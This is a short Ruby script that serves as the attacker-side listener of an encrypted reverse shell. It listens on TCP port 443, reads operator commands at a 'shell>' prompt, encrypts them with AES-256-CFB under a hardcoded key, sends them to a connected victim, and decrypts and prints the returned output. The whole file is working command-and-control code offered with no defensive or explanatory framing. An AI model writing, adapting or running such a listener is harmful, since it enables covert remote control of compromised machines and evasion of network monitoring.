#!/usr/bin/env ruby
require 'openssl'
require 'base64'
require 'socket'
def encrypt(command)
	@aes.encrypt
	@aes.key = @key
	#aes.iv = iv
	encrypted_data = @aes.update(command) + @aes.final
	encoded_command = Base64.encode64(encrypted_data)
	return encoded_command
end
def decrypt(command)
	@aes.decrypt
	@aes.key = @key
	#aes.iv = iv
	base64_data = command
	decode_data = Base64.decode64(base64_data)
	decrypt_data = @aes.update(decode_data) + @aes.final
	return decrypt_data
end
def start_loop(client)
	loop {
		command = [(print ("shell> ")), $stdin.gets.rstrip][1]
		start_loop(client) if command == ''
		encrypted_command = encrypt(command)
		client.print("#{encrypted_command}")
		exit if command == 'exit'
		out_put = ''
		recv_length = 1024
		while (tmp = client.recv(recv_length))
			out_put += tmp
			break if tmp.length < recv_length
		end
		#puts out_put.chomp
		decrypted_command = decrypt(out_put.chomp)
		puts decrypted_command
	}
end
begin
	@aes = OpenSSL::Cipher.new("AES-256-CFB")
	#rand_key = 32.times.map {[*'a'..'z',*'A'..'Z',*'0'..'9',*'!'..')'].sample}.join
	@key = 'abcdefghijklmnopqrstuvwxyz123456'
	server = TCPServer.open(443)
	client = server.accept
	start_loop(client)
end